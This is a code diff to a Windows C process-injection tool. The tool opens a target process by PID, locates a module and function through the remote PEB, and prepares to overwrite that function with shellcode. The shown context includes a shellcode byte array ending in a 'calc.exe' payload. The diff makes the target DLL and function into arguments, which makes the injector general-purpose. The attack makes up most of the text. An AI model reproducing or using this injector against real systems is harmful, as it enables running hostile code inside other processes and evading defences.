@@ -33,8 +33,9 @@ int main(int argc, char *argv[]) {
         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
         "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
 
-    if(argc < 2) {
-        printf("PID required.\n");
+    // Expecting: program.exe <PID> <DLL_Name> <Function_Name>
+    if(argc < 4) {
+        printf("[ERROR] Usage: %s <PID> <Target_DLL> <Target_Function>\n", argv[0]);
         return -1;
     }
 
@@ -46,6 +47,9 @@ int main(int argc, char *argv[]) {
         printf("[ERROR] Failed to obtain process ID!\n");
         return -1;
     }
+
+    char* targetDll = argv[2];
+    char* targetFunction = argv[3];
 
     printf("[*] Running PI with target PID: %u\n", pid);
 
@@ -69,21 +73,21 @@ int main(int argc, char *argv[]) {
     // Assuming peb_address holds the valid memory location of the PEB
     PPEB peb_ptr = (PPEB)remotePebAddr;
 
-    printf("[*] Attempting to locate the module base.\n");
-    PVOID targetModuleBase = GetModuleBaseManualRemote(pHandle, peb_ptr, "KERNEL32.dll");
+    printf("[*] Attempting to locate the module base for %s.\n", targetDll);
+    PVOID targetModuleBase = GetModuleBaseManualRemote(pHandle, peb_ptr, targetDll);
     if(!targetModuleBase) {
         printf("[ERROR] Failed to locate target module base.\n");
         return -1;        
     }
 
     printf("[*] Target DLL base located at: : 0x%016llx\n", targetModuleBase);
-    
-    LPVOID bufferAddress = (LPVOID)GetRemoteProcAddressManual(pHandle, targetModuleBase, "FileTimeToSystemTime");  
+
+    LPVOID bufferAddress = (LPVOID)GetRemoteProcAddressManual(pHandle, targetModuleBase, targetFunction);  
     if (bufferAddress == NULL) {
-        printf("[ERROR] Failed to locate target function FileTimeToSystemTime! Error: %lu\n", pid, GetLastError());
+        printf("[ERROR] Failed to locate target function %s! Error: %lu\n", targetFunction, GetLastError());
         return -1;
     }
-    printf("[*] Target ntdll.dll!FileTimeToSystemTime located at: 0x%016llx\n", bufferAddress);
+    printf("[*] Target %s!%s located at: 0x%016llx\n", targetDll, targetFunction, bufferAddress);
 
     printf("[*] Press Enter to write the shellcode to the buffer address: ");
     getchar();
